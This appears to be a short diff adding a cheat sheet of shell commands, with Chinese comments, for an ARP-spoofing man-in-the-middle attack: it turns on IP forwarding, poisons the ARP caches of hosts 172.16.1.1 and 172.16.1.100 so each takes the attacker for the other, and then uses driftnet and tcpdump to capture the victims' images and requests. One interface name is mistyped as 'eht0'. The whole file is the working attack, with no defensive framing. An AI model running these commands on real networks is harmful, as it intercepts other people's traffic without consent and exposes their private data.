@@ -1,0 +1,6 @@
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eht0 -t 172.16.1.1 172.16.1.100   #告诉1.1 我是1.100
+arpspoof -i eth0 -t 172.16.1.100 172.16.1.1   #告诉1.100 我是1.1
+
+driftnet -i eth0 #截获图片
+tcpdump -i eth0 #截获请求
